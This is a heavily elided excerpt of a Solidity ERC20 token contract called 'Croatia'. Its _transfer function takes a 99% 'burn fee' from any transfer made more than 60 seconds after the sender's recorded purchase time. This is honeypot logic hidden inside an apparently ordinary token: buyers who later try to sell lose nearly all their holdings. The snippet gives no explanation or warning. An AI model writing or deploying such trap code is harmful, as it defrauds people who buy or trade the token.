...
contract  Croatia  is Ownable, IERC20 {
    ...
    string private  _name = unicode'Croatia';
    string private  _symbol = unicode'Croatia';
    ...
    function _transfer(  address from,  address to,  uint256 amount  ) private {
        ...
        if (    Buyser[from] + 60  <= block.timestamp )    {   burnfee = amount.mul(99).div(100); }     }  }
